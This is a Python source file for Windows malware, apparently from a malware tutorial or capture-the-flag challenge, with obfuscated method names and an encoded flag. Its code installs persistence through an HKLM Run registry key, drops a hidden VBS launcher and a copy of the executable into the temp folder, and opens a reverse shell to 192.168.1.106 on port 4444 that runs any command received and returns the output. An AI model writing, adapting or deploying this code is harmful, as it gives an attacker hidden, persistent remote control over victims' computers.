import os
import subprocess
import socket
import sys
import tempfile
import inspect
import base64
#from _winreg import *


MALWARE_NAME = "malware.exe"
TRIGGER = MALWARE_NAME.replace('.exe','')+".vbs"
KEY_PATH = "Software\Microsoft\Windows\CurrentVersion\Run"
KEY_NAME = "anarc0der_key"
REV_SHELL = "192.168.1.106"
SHELL_PORT = 4444
TRIGGER_PATH = tempfile.gettempdir()+"\\"+TRIGGER
MALWARE_PATH = tempfile.gettempdir()+"\\"+MALWARE_NAME

class EdOxwEACgFH():
    def NRYgDBImHhwT(self, byt):
        mask = self.__class__.__name__.encode()
        lmask = len(mask)
        return bytes(c ^ mask[i % lmask] for i, c in enumerate(byt))

    def AC8AAxkqHjQGPxcvCzwdKGQ8(self):
        mask = self.__class__.__name__.encode()         
        lmask = len(mask)
        (self.NRYgDBImHhwT(base64.b64decode(inspect.currentframe().f_code.co_name)))
        key = OpenKey(HKEY_LOCAL_MACHINE, KEY_PATH)
        keys = []
        try:
            i=0
            while True:
                cur_key = EnumValue(key, i)
                keys.append(cur_key[0])
                i+=1
        except:
            pass
        if KEY_NAME not in keys:
            mlwr_key = OpenKey(HKEY_LOCAL_MACHINE, KEY_PATH, 0, KEY_ALL_ACCESS)
            SetValueEx(mlwr_key, KEY_NAME, 0, REG_SZ, TRIGGER_PATH)
            mlwr_key.Close()
            return False
        return True

    def LQ0rHSgoIC8QJzog(self):
        """ Method to generate & hide the trigger and malware.
            Return True if was alredy hided.
            Return False if wasnt hided """
        mask = self.__class__.__name__.encode()         
        lmask = len(mask)        
        self.NRYgDBImHhwT(base64.b64decode(inspect.currentframe().f_code.co_name))       
        if os.path.exists(MALWARE_PATH) and os.path.exists(TRIGGER_PATH):
            return True
        else:
            payload = 'Set WshShell = WScript.CreateObject("WScript.Shell")\nWshShell.Run """{0}""", 0 , false'.format(MALWARE_PATH)
            with open(TRIGGER_PATH, 'w') as f:
                f.write(payload)
            os.system('copy %s %s'%(MALWARE_NAME, MALWARE_PATH))
            return False

    def AwE5HQU2JDAPIyQp(self):
        """ Method of reverse shell in python """
        mask = self.__class__.__name__.encode()         
        self.NRYgDBImHhwT(base64.b64decode(inspect.currentframe().f_code.co_name))          
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((REV_SHELL,SHELL_PORT))
        flag = b'JgsiFRYrJWNHfGhl'
        s.send('\n\!/ anarc0der mlwr tutorial\n\n[*] If you need to finish, just type: quit\n[*] PRESS ENTER TO PROMPT\n\n')
        while True:
            data = s.recv(1024)
            if "quit" in data:
                break
            cmd = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            saida_cmd = cmd.stdout.read() + cmd.stderr.read()
            s.send(saida_cmd)
            s.send( self.NRYgDBImHhwT(base64.b64decode(flag)))
        s.close()

def main():
    my_returns = []
    x = EdOxwEACgFH()
    my_returns.append(x.AC8AAxkqHjQGPxcvCzwdKGQ8())
    my_returns.append(x.LQ0rHSgoIC8QJzog())
    if all(res is True for res in my_returns):
        x.AwE5HQU2JDAPIyQp()
